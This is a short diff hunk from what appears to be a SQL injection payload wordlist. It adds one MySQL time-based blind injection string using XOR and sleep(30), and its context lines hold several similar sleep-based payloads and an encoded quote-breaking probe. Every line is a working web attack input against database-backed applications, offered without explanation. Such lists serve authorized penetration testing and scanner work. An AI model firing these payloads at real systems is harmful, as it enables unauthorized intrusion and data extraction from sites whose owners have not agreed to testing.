@@ -106,6 +106,7 @@ XOR(if(now()=sysdate(),sleep30,0))XOR
 0'XOR(if(now()=sysdate(),sleep30,0))XOR
 0'XOR(if(now()=sysdate(),sleep30,0))XOR'
 0'XOR(if(now()=sysdate(),sleep(5*6),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(30),0))XOR'
 '+(select*from(select(sleep30))a)+'
 1%27/**/%256fR/**/50%2521%253D22%253B%2523
 "0\"XOR(if(now()=sysdate(),sleep30,0))XOR\"Z"
